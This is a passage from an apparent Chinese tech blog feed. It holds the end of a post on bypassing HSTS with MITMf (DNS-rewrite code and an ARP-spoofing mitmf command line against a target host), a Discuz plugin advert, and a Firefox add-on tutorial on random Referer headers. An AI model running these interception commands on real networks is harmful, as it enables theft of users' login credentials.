访问login.taobao.com 跳转到 weblogin.taobao.com 。<br>具体代码  <a href="https://github.com/byt3bl33d3r/MITMf/blob/master/core/servers/DNS.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf/blob/master/core/servers/DNS.py</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if hsts:</span><br><span class="line">    if qname in hstsconfig:</span><br><span class="line">        response = self.hstsbypass(hstsconfig[qname], qname, nameservers, d)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    elif qname[:4] == &apos;wwww&apos;:</span><br><span class="line">        response = self.hstsbypass(qname[1:], qname, nameservers, d)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    elif qname[:3] == &apos;web&apos;:</span><br><span class="line">        response = self.hstsbypass(qname[3:], qname, nameservers, d)</span><br><span class="line">        return response</span><br></pre></td></tr></table></figure></p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>kali执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install  mitmf</span><br><span class="line">mitmf -i eth0 --spoof --arp   --hsts --gateway   10.211.55.1  --targets   10.211.55.4</span><br></pre></td></tr></table></figure></p><p>ubuntu 打开 www.xxxx.com<br>效果<br><a href="/uploads/2016/04/hsts_bypass.jpg"><img src="/uploads/2016/04/hsts_bypass-300x85.jpg" alt="" title="hsts_bypass"></a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>MITMf   <a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;HSTS简介&quot;&gt;&lt;a href=&quot;#HSTS简介&quot; class=&quot;headerlink&quot; title=&quot;HSTS简介&quot;&gt;&lt;/a&gt;HSTS简介&lt;/h3&gt;&lt;p&gt;HSTS是HTTP Strict Transport Security的缩写，即：”HTTP严格安全传输”。当浏览器第一次访问一个HSTS站点,会跳转到https页面,并种植hsts,下次再访问此站时,只要HSTS 还在有效期中,浏览器就会响应一个 HTTP 307 头,在不经过网络请求直接本地强制http跳转到https。这样可以有效防止基于SSLStrip的中间人攻击,对于伪造的证书，会显示错误，并且不允许用户忽略警告。&lt;br&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="hsts" scheme="http://yaseng.org/tags/hsts/"/>
    
      <category term="hsts bypass" scheme="http://yaseng.org/tags/hsts-bypass/"/>
    
      <category term="mitmf" scheme="http://yaseng.org/tags/mitmf/"/>
    
      <category term="中间人攻击" scheme="http://yaseng.org/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>discuz 答题获取邀请码 qa_invite1.1</title>
    <link href="http://yaseng.org/discuz-qa-invite-1-1.html"/>
    <id>http://yaseng.org/discuz-qa-invite-1-1.html</id>
    <published>2016-04-17T00:06:17.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h3><p>答题获取邀请码插件支持后台自定义题目，自定义生成邀请码，设置题目数量和合格数量，方便站长推广注册 。<br>插件地址  <a href="http://addon.discuz.com/?@qa_invite.plugin" title="http://addon.discuz.com/?@qa_invite.plugin" target="_blank" rel="noopener">http://addon.discuz.com/?@qa_invite.plugin</a><br><a href="/uploads/2016/04/qa_invite_1.jpg"><img src="/uploads/2016/04/qa_invite_1-300x113.jpg" alt="" title="qa_invite_1"></a><br><a id="more"></a></p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>后台下载安装，然后设置题目数量和答对题目数量，添加相应数量题目，并根据规则生成邀请码，邀请码注册请先在站点-注册设置里面，开启邀请码注册 。</p><h3 id="插件功能"><a href="#插件功能" class="headerlink" title="插件功能"></a>插件功能</h3><p>1:后台自定义题目，自定义生成邀请码<br>2：简单方便管理题库内容<br>3：题目数量灵活多变</p><h3 id="UaUc技术支持"><a href="#UaUc技术支持" class="headerlink" title="UaUc技术支持"></a>UaUc技术支持</h3><p>UaUcNet专业服务于广大discuz站长，提供插件私人定制，二次开发，模板定制，论坛疑难问题解答，搬家升级等服务！以专业成熟的技术水平，认真负责的工作态度，为您的论坛运营提供最贴心的技术服务！ 详情请联系UaUCNet团队客服 QQ：189333720  。<br><a href="tencent://message/?uin=189333720&amp;Site=http://www.uauc.net&amp;Menu=yes" target="_blank" rel="noopener"><img src="http://wpa.qq.com/pa?p=2:189333720:42" alt="QQ" title="QQ"></a> </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;插件介绍&quot;&gt;&lt;a href=&quot;#插件介绍&quot; class=&quot;headerlink&quot; title=&quot;插件介绍&quot;&gt;&lt;/a&gt;插件介绍&lt;/h3&gt;&lt;p&gt;答题获取邀请码插件支持后台自定义题目，自定义生成邀请码，设置题目数量和合格数量，方便站长推广注册 。&lt;br&gt;插件地址  &lt;a href=&quot;http://addon.discuz.com/?@qa_invite.plugin&quot; title=&quot;http://addon.discuz.com/?@qa_invite.plugin&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://addon.discuz.com/?@qa_invite.plugin&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/uploads/2016/04/qa_invite_1.jpg&quot;&gt;&lt;img src=&quot;/uploads/2016/04/qa_invite_1-300x113.jpg&quot; alt=&quot;&quot; title=&quot;qa_invite_1&quot;&gt;&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="discuz 插件" scheme="http://yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
    
      <category term="uauc作品" scheme="http://yaseng.org/tags/uauc%E4%BD%9C%E5%93%81/"/>
    
  </entry>
  
  <entry>
    <title>firefox 扩展开发笔记（三）:高级ui交互编程</title>
    <link href="http://yaseng.org/firefox-addon-advanced-ui-develop.html"/>
    <id>http://yaseng.org/firefox-addon-advanced-ui-develop.html</id>
    <published>2016-03-31T04:34:44.000Z</published>
    <updated>2016-09-12T09:36:18.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最新版本的Firefox 终于舍弃了鸡肋的xul布局,可以使用原生的html用作ui交互,插件界面中可以引入 bootstrap jQuery等库,大大简便了布局和高度自定义化,本文以一个随机自定义referer 实例来记录jpm 高级ui交互编程。</p><h3 id="界面布局"><a href="#界面布局" class="headerlink" title="界面布局"></a>界面布局</h3><h4 id="ui-控件"><a href="#ui-控件" class="headerlink" title="ui 控件"></a>ui 控件</h4><p>官方api中提供的ui控件如下<br>1. ActionButton   动作按钮<br>2. ToggleButton   切换按钮<br>3. Frame           框架<br>4. Toolbar        工具栏<br>5. Sidebar        网站边栏<br>具体可以参考官方文档 <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</a><br><code><br><a id="more"></a></code></p><h4 id="panel"><a href="#panel" class="headerlink" title="panel"></a>panel</h4><p>面板为点击图标或者Toolbar 弹出的页面,声明代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> panel = panels.Panel(&#123;</span><br><span class="line">  width:<span class="number">420</span>,</span><br><span class="line">  height:<span class="number">420</span>,</span><br><span class="line">  contentURL: self.data.url(<span class="string">"panel.html"</span>),</span><br><span class="line">  contentScriptFile : [ self.data.url(<span class="string">"js/jquery.js"</span>),self.data.url(<span class="string">"../lib/panel.js"</span>)],</span><br><span class="line">  onHide: handleHide</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>/data/panel.html 文件为布局内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap.min.css"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    .group &#123;</span></span><br><span class="line"><span class="undefined">      margin-top:8px;</span></span><br><span class="line"><span class="undefined">      text-align:center;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"toggle"</span> /&gt;</span>开启</span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-info"</span>&gt;</span>referer 列表<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">rows</span>=<span class="string">"8"</span> <span class="attr">id</span>=<span class="string">"referer"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-info"</span>&gt;</span>站点列表<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">rows</span>=<span class="string">"4"</span> <span class="attr">id</span>=<span class="string">"site"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>  <span class="attr">id</span>=<span class="string">"save"</span> &gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图<br><a href="/uploads/2016/03/panel_2.jpg"><img src="/uploads/2016/03/panel_2-300x285.jpg" alt="" title="panel_2"></a></p><h4 id="tab-新页面"><a href="#tab-新页面" class="headerlink" title="tab 新页面"></a>tab 新页面</h4><p>panel 界面只适合弹出小型对话框,功能繁琐的页面则需要一个新全浏览器页面。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tabs = <span class="built_in">require</span>(<span class="string">"sdk/tabs"</span>);</span><br><span class="line">tabs.open(data.url(<span class="string">"option.html"</span>));</span><br></pre></td></tr></table></figure><p>效果<br><a href="/uploads/2016/03/tab_3.jpg"><img src="/uploads/2016/03/tab_3-300x63.jpg" alt="" title="tab_3"></a></p><h3 id="事件响应"><a href="#事件响应" class="headerlink" title="事件响应"></a>事件响应</h3><p>引入对应js文件之后就可以和网页一样写事件响应了,为了简便代码还可以引入jQuery库。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contentScriptFile : [ self.data.url(<span class="string">"js/jquery.js"</span>),self.data.url(<span class="string">"../lib/panel.js"</span>)],</span><br></pre></td></tr></table></figure><p>响应代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> btn_toggle = $(<span class="string">"#toggle"</span>);</span><br><span class="line">    <span class="keyword">var</span> btn_save = $(<span class="string">"#save"</span>);</span><br><span class="line">    <span class="keyword">var</span> text_data= $(<span class="string">"#referer"</span>);</span><br><span class="line">    <span class="keyword">var</span> text_site= $(<span class="string">"#site"</span>);</span><br><span class="line">   <span class="comment">//初始化界面</span></span><br><span class="line">    self.port.on(<span class="string">"init"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">enable,referer,site</span>) </span>&#123;</span><br><span class="line">        btn_toggle.attr(<span class="string">"checked"</span>, enable);</span><br><span class="line">        text_data.val(referer);</span><br><span class="line">        text_site.val(site);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//切换事件</span></span><br><span class="line">    btn_toggle.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//prefs['enable']= this.checked;</span></span><br><span class="line">        self.port.emit(<span class="string">"toggle"</span>, <span class="keyword">this</span>.checked);    </span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//保存事件</span></span><br><span class="line">    btn_save.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        self.port.emit(<span class="string">"save"</span>,text_data.val(),text_site.val());    </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ui控件与插件代码交互需要通过一个port对象,提供消息发送和接收,事件交互。<br>官方文档<br><a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port</a></p><p>当点击切换按钮时,对应的交互代码为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">panel.port.on(<span class="string">"toggle"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">enable</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  prefs[<span class="string">'enable'</span>] = enable ;</span><br><span class="line">  <span class="keyword">if</span>(enable)&#123;</span><br><span class="line"></span><br><span class="line">    btn_enable();</span><br><span class="line">    httpRequestObserver.register();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    btn_disable();</span><br><span class="line">    httpRequestObserver. unregister();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>又如  main.js 中调用panel.js </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>  default_referer=[</span><br><span class="line"><span class="string">'http://www.baidu.com'</span>,</span><br><span class="line"><span class="string">'http://www.google.com'</span>,</span><br><span class="line"><span class="string">'http://www.hao123.com'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> default_site=[<span class="string">'127.0.0.1'</span>];</span><br><span class="line"><span class="keyword">if</span> (!ss.storage.referer)&#123;</span><br><span class="line">  <span class="comment">//赋值</span></span><br><span class="line">  ss.storage.referer=default_referer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss.storage.site)&#123;</span><br><span class="line"></span><br><span class="line">  ss.storage.site=default_site;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取值</span></span><br><span class="line"><span class="keyword">var</span>  strReferer=ss.storage.referer.join(<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">var</span>  strSite=ss.storage.site.join(<span class="string">'\n'</span>);</span><br><span class="line">panel.port.emit(<span class="string">"init"</span>,prefs[<span class="string">'enable'</span>],strReferer,strSite);</span><br></pre></td></tr></table></figure><h3 id="数据储存"><a href="#数据储存" class="headerlink" title="数据储存"></a>数据储存</h3><p>数据储存的api  sdk/simple-storage,可以自由存取各种数据对象。<br>官方demo</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ss = <span class="built_in">require</span>(<span class="string">"sdk/simple-storage"</span>);</span><br><span class="line">ss.storage.myArray = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>];</span><br><span class="line">ss.storage.myBoolean = <span class="literal">true</span>;</span><br><span class="line">ss.storage.myNull = <span class="literal">null</span>;</span><br><span class="line">ss.storage.myNumber = <span class="number">3.1337</span>;</span><br><span class="line">ss.storage.myObject = &#123; <span class="attr">a</span>: <span class="string">"foo"</span>, <span class="attr">b</span>: &#123; <span class="attr">c</span>: <span class="literal">true</span> &#125;, <span class="attr">d</span>: <span class="literal">null</span> &#125;;</span><br><span class="line">ss.storage.myString = <span class="string">"O frabjous day!"</span>;</span><br></pre></td></tr></table></figure><h3 id="随机referer-实现"><a href="#随机referer-实现" class="headerlink" title="随机referer 实现"></a>随机referer 实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123; ToggleButton &#125; = <span class="built_in">require</span>(<span class="string">'sdk/ui/button/toggle'</span>);</span><br><span class="line"><span class="keyword">var</span> panels = <span class="built_in">require</span>(<span class="string">"sdk/panel"</span>);</span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">require</span>(<span class="string">"sdk/self"</span>);</span><br><span class="line"><span class="keyword">var</span> prefs = <span class="built_in">require</span>(<span class="string">"sdk/simple-prefs"</span>).prefs;</span><br><span class="line"><span class="keyword">var</span> ss = <span class="built_in">require</span>(<span class="string">"sdk/simple-storage"</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;Cc, Ci&#125; = <span class="built_in">require</span>(<span class="string">"chrome"</span>);</span><br><span class="line"><span class="keyword">var</span> httpRequestObserver =</span><br><span class="line">&#123;</span><br><span class="line">  observe: <span class="function"><span class="keyword">function</span>(<span class="params">subject, topic, data</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (topic == <span class="string">"http-on-modify-request"</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> httpChannel = subject.QueryInterface(Ci.nsIHttpChannel);</span><br><span class="line">      <span class="keyword">var</span> host= httpChannel.originalURI.host;</span><br><span class="line">      <span class="comment">//判断是否在站点列表中</span></span><br><span class="line">      <span class="keyword">if</span> (ss.storage.site.indexOf(host) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        httpChannel.setRequestHeader(<span class="string">"Referer"</span>, read_referer(), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  get observerService() &#123;</span><br><span class="line">    <span class="keyword">return</span> Cc[<span class="string">"@mozilla.org/observer-service;1"</span>]</span><br><span class="line">    .getService(Ci.nsIObserverService);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//注册监听器</span></span><br><span class="line">  register: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.observerService.addObserver(<span class="keyword">this</span>, <span class="string">"http-on-modify-request"</span>, <span class="literal">false</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//卸载</span></span><br><span class="line">  unregister: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.observerService.removeObserver(<span class="keyword">this</span>, <span class="string">"http-on-modify-request"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>1.<a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</a><br>2. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port</a><br>3. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/tabs" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/tabs</a><br>4. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/using_port" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/using_port</a><br>5. <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/simple-storage" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/simple-storage</a><br>6. <a href="https://developer.mozilla.org/en-US/docs/Setting_HTTP_request_headers" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Setting_HTTP_request_headers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最新版本的Firefox 终于舍弃了鸡肋的xul布局,可以使用原生的html用作ui交互,插件界面中可以引入 bootstrap jQuery等库,大大简便了布局和高度自定义化,本文以一个随机自定义referer 实例来记录jpm 高级ui交互编程。&lt;/p&gt;
&lt;h3 id=&quot;界面布局&quot;&gt;&lt;a href=&quot;#界面布局&quot; class=&quot;headerlink&quot; title=&quot;界面布局&quot;&gt;&lt;/a&gt;界面布局&lt;/h3&gt;&lt;h4 id=&quot;ui-控件&quot;&gt;&lt;a href=&quot;#ui-控件&quot; class=&quot;headerlink&quot; title=&quot;ui 控件&quot;&gt;&lt;/a&gt;ui 控件&lt;/h4&gt;&lt;p&gt;官方api中提供的ui控件如下&lt;br&gt;1. ActionButton   动作按钮&lt;br&gt;2. ToggleButton   切换按钮&lt;br&gt;3. Frame           框架&lt;br&gt;4. Toolbar        工具栏&lt;br&gt;5. Sidebar        网站边栏&lt;br&gt;具体可以参考官方文档 &lt;a href=&quot;https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui&lt;/a&gt;&lt;br&gt;&lt;code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Firefox" scheme="http://yaseng.org/categories/Firefox/"/>
    
      <category term="西部大开发" scheme="http://yaseng.org/categories/Firefox/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Firefox" scheme="http://yaseng.org/tags/Firefox/"/>
    
      <category term="firefox 扩展开发笔记" scheme="http://yaseng.org/tags/firefox-%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    
      <category term="firefox扩展" scheme="http://yaseng.org/tags/firefox%E6%89%A9%E5%B1%95/"/>
    
      <category term="firefox插件" scheme="http://yaseng.org/tags/firefox%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>discuz 模拟批量上传附件发帖 </title>
    <link href="http://yaseng.org/discuz-attachment-and-posting.html"/>
    <id>http://yaseng.org/discuz-attachment-and-posting.html</id>
    <published>2016-03-31T03:21:58.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
